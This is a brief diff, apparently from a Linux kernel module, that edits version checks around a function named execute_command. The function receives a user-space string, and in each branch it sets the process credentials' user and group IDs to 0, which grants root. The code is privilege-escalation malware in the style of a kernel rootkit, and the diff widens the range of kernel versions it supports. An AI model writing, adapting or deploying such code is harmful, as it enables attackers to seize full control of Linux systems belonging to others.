@@ -648,13 +648,13 @@ int execute_command(const char __user *str, size_t length)
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
 */
-#if LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 3, 0)
         
         creds->uid = creds->euid = 0;
         creds->gid = creds->egid = 0;
         
 //#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0)
-#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 32)
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 3, 0)
 
         creds->uid.val = creds->euid.val = 0;
         creds->gid.val = creds->egid.val = 0;
